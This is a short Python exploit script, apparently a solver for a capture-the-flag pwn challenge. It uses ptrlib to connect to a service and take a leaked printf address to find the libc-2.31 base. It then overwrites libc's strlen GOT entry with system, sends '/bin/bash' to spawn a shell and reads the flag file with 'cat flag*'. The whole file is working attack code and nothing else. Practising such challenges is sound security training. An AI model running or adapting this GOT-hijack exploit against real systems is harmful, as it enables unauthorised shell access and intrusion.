from ptrlib import Socket, ELF
import os

HOST = os.getenv('HOST', 'localhost')
PORT = os.getenv('PORT', '9999')

libc = ELF("./distfiles/libc-2.31.so")

sock = Socket(HOST, int(PORT))
libc_base = int(sock.recvlineafter("<printf> = "), 16) - libc.symbol("printf")
print(hex(libc_base))

strlen_got_offset = 0x1eb0a8
strlen_got_addr = libc_base + strlen_got_offset
system_addr = libc_base + libc.symbol("system")

sock.sendlineafter("address: ", hex(strlen_got_addr))
sock.sendlineafter("value: ", hex(system_addr))
sock.sendlineafter("data: ", "/bin/bash")

sock.sendline("cat flag*")
print(sock.recvuntil("}"))
